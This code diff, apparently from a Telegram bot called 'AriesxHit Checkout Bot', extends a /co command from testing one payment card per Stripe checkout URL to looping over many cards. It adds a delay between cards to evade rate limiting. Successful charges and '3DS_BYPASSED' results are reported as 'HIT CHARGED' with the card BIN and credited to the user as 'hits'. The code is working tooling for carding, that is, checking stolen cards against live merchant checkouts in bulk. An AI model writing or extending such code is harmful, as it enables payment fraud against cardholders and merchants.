@@ -473,15 +473,22 @@ router.post('/webhook', async (req, res) => {
         }
 
         const checkoutUrl = parts[0];
-        const cardData = parts[1]; // Only take the first card after URL
+        const cardStrings = parts.slice(1); // Get all cards after URL
 
-        // Check if multiple cards provided
-        if (parts.length > 2) {
-          await sendMessage(BOT_TOKEN, chatId, `❌ <b>Multiple Cards Detected</b>\n\nPlease test <b>one card at a time</b>.\n\nUsage: <code>/co &lt;checkout_url&gt; &lt;card_data&gt;</code>\n\nExample:\n<code>/co https://checkout.stripe.com/... 4111111111111111|12|25|123</code>`);
+        if (cardStrings.length === 0) {
+          await sendMessage(BOT_TOKEN, chatId, `❌ <b>No Cards Provided</b>\n\nUsage: <code>/co &lt;checkout_url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\nExample:\n<code>/co https://checkout.stripe.com/... 4111111111111111|12|25|123 4222222222222222|01|26|456</code>`);
           return;
         }
 
-        if (!cardData || !cardData.includes('|')) {
+        // Validate all cards have proper format
+        const validCards = [];
+        for (const cardStr of cardStrings) {
+          if (cardStr.includes('|')) {
+            validCards.push(cardStr);
+          }
+        }
+
+        if (validCards.length === 0) {
           await sendMessage(BOT_TOKEN, chatId, `❌ <b>Invalid Card Format</b>\n\nCard format: <code>number|month|year|cvv</code>\n\nExample:\n<code>4111111111111111|12|25|123</code>`);
           return;
         }
@@ -493,86 +500,96 @@ router.post('/webhook', async (req, res) => {
           return;
         }
 
-        // Send processing message with full card number
-        const processingMsg = await sendMessage(BOT_TOKEN, chatId, `🔄 <b>Processing Checkout...</b>\n\nURL: <code>${checkoutUrl.substring(0, 50)}...</code>\nCard: <code>${cardData.split('|')[0]}</code>\n\nPlease wait...`);
+        // Send initial processing message
+        await sendMessage(BOT_TOKEN, chatId, `🔄 <b>Processing ${validCards.length} Cards...</b>\n\nURL: <code>${checkoutUrl.substring(0, 50)}...</code>\nCards: <code>${validCards.length} cards loaded</code>\n\nStarting checkout tests...`);
 
-        try {
-          // Process the checkout
-          const result = await checkoutService.processCheckout(checkoutUrl, cardData);
+        // Process each card
+        for (let i = 0; i < validCards.length; i++) {
+          const cardData = validCards[i];
+          const cardNumber = cardData.split('|')[0];
 
-          // Format result message
-          let resultText = `💳 <b>Checkout Result</b>\n`;
-          resultText += `═══════════════════\n\n`;
+          console.log(`Processing card ${i + 1}/${validCards.length}: ${cardNumber}`);
 
-          if (result.success) {
-            if (result.status === 'CHARGED') {
-              const cardNumber = result.card || cardData.split('|')[0];
-              const bin = cardNumber.substring(0, 6);
-              const amount = result.amount ? `$${(result.amount / 100).toFixed(2)}` : '$9.99';
-              const currency = result.currency?.toUpperCase() || 'USD';
-              const currentTime = new Date().toLocaleString('en-US', {
-                year: 'numeric',
-                month: 'numeric',
-                day: 'numeric',
-                hour: 'numeric',
-                minute: '2-digit',
-                second: '2-digit',
-                hour12: true
-              });
+          try {
+            // Process the checkout
+            const result = await checkoutService.processCheckout(checkoutUrl, cardData);
 
-              resultText = `🎯 𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅\n\n`;
-              resultText += `「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : Charged\n`;
-              resultText += `「❃」 𝗔𝗺𝗼𝘂𝗻𝘁 : ${amount} ${currency}\n`;
-              resultText += `「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : ${parsed.sessionId ? 'Stripe Checkout' : 'Unknown'}\n`;
-              resultText += `「❃」 𝗘𝗺𝗮𝗶𝗹 : ${tgId}@user.bot\n`;
-              resultText += `「❃」 𝗕𝗜𝗡 :- ${bin}\n`;
-              resultText += `「❃」 𝗛𝗶𝘁 𝗕𝘆 : ${tgId}\n`;
-              resultText += `「❃」 𝗧𝗶𝗺𝗲 : ${currentTime}\n`;
-            } else if (result.status === '3DS_BYPASSED') {
-              resultText += `🎯 <b>3DS BYPASSED!</b>\n`;
-              resultText += `💰 Amount: ${result.amount || 'N/A'} ${result.currency?.toUpperCase() || 'USD'}\n`;
+            // Format result message
+            let resultText = `💳 <b>Card ${i + 1}/${validCards.length}</b> - ${cardNumber}\n`;
+            resultText += `═══════════════════\n\n`;
+
+            if (result.success) {
+              if (result.status === 'CHARGED') {
+                const cardNumber = result.card || cardData.split('|')[0];
+                const bin = cardNumber.substring(0, 6);
+                const amount = result.amount ? `$${(result.amount / 100).toFixed(2)}` : '$9.99';
+                const currency = result.currency?.toUpperCase() || 'USD';
+                const currentTime = new Date().toLocaleString('en-US', {
+                  year: 'numeric',
+                  month: 'numeric',
+                  day: 'numeric',
+                  hour: 'numeric',
+                  minute: '2-digit',
+                  second: '2-digit',
+                  hour12: true
+                });
+
+                resultText = `🎯 𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅\n\n`;
+                resultText += `「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : Charged\n`;
+                resultText += `「❃」 𝗔𝗺𝗼𝘂𝗻𝘁 : ${amount} ${currency}\n`;
+                resultText += `「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : ${parsed.sessionId ? 'Stripe Checkout' : 'Unknown'}\n`;
+                resultText += `「❃」 𝗘𝗺𝗮𝗶𝗹 : ${tgId}@user.bot\n`;
+                resultText += `「❃」 𝗕𝗜𝗡 :- ${bin}\n`;
+                resultText += `「❃」 𝗛𝗶𝘁 𝗕𝘆 : ${tgId}\n`;
+                resultText += `「❃」 𝗧𝗶𝗺𝗲 : ${currentTime}\n`;
+              } else if (result.status === '3DS_BYPASSED') {
+                resultText += `🎯 <b>3DS BYPASSED!</b>\n`;
+                resultText += `💰 Amount: ${result.amount || 'N/A'} ${result.currency?.toUpperCase() || 'USD'}\n`;
+                resultText += `💳 Card: ${result.card || cardData.split('|')[0]}\n`;
+                resultText += `\n═══════════════════\n🤖 AriesxHit Checkout Bot`;
+              } else if (result.status === '3DS') {
+                resultText += `🔒 <b>3DS Required</b>\n`;
+                resultText += `💰 Amount: ${result.amount || 'N/A'} ${result.currency?.toUpperCase() || 'USD'}\n`;
+                resultText += `💳 Card: ${result.card || cardData.split('|')[0]}\n`;
+                resultText += `ℹ️ 3DS authentication may be required\n`;
+                resultText += `\n═══════════════════\n🤖 AriesxHit Checkout Bot`;
+              }
+            } else {
+              resultText += `❌ <b>Failed</b>\n`;
               resultText += `💳 Card: ${result.card || cardData.split('|')[0]}\n`;
-            } else if (result.status === '3DS') {
-              resultText += `🔒 <b>3DS Required</b>\n`;
-              resultText += `💰 Amount: ${result.amount || 'N/A'} ${result.currency?.toUpperCase() || 'USD'}\n`;
-              resultText += `💳 Card: ${result.card || cardData.split('|')[0]}\n`;
-              resultText += `ℹ️ 3DS authentication may be required\n`;
-            }
-          } else {
-            resultText += `❌ <b>Failed</b>\n`;
-            resultText += `💳 Card: ${result.card || cardData.split('|')[0]}\n`;
-            resultText += `📋 Status: ${result.status || 'UNKNOWN'}\n`;
+              resultText += `📋 Status: ${result.status || 'UNKNOWN'}\n`;
 
-            if (result.error) {
-              resultText += `❗ Error: ${result.error}\n`;
+              if (result.error) {
+                resultText += `❗ Error: ${result.error}\n`;
+              }
+              if (result.code) {
+                resultText += `🔢 Code: ${result.code}\n`;
+              }
+              if (result.decline_code) {
+                resultText += `🚫 Decline: ${result.decline_code}\n`;
+              }
+              resultText += `\n═══════════════════\n🤖 AriesxHit Checkout Bot`;
             }
-            if (result.code) {
-              resultText += `🔢 Code: ${result.code}\n`;
+
+            // Send result for this card
+            await sendMessage(BOT_TOKEN, chatId, resultText);
+
+            // If successful, increment hits
+            if (result.success && (result.status === 'CHARGED' || result.status === '3DS_BYPASSED')) {
+              console.log('[CO_COMMAND] Successful checkout, incrementing hits for user:', tgId);
+              incrementUserHits(tgId);
             }
-            if (result.decline_code) {
-              resultText += `🚫 Decline: ${result.decline_code}\n`;
+
+            // Small delay between cards to avoid rate limiting
+            if (i < validCards.length - 1) {
+              await new Promise(resolve => setTimeout(resolve, 2000));
             }
+
+          } catch (checkoutError) {
+            console.error('[CO_COMMAND] Checkout processing error:', checkoutError);
+            const errorMsg = `❌ <b>Card ${i + 1} Error</b>\n💳 ${cardNumber}\n\nAn error occurred while processing this card:\n<code>${checkoutError.message}</code>`;
+            await sendMessage(BOT_TOKEN, chatId, errorMsg);
           }
-
-          // Add footer only for non-success messages
-          if (!result.success || result.status !== 'CHARGED') {
-            resultText += `\n═══════════════════\n`;
-            resultText += `🤖 AriesxHit Checkout Bot`;
-          }
-
-          // Send result
-          await sendMessage(BOT_TOKEN, chatId, resultText);
-
-          // If successful, increment hits
-          if (result.success && (result.status === 'CHARGED' || result.status === '3DS_BYPASSED')) {
-            console.log('[CO_COMMAND] Successful checkout, incrementing hits for user:', tgId);
-            incrementUserHits(tgId);
-          }
-
-        } catch (checkoutError) {
-          console.error('[CO_COMMAND] Checkout processing error:', checkoutError);
-          const errorMsg = `❌ <b>Processing Error</b>\n\nAn error occurred while processing the checkout:\n<code>${checkoutError.message}</code>\n\nPlease try again or contact support.`;
-          await sendMessage(BOT_TOKEN, chatId, errorMsg);
         }
 
       } catch (cmdError) {
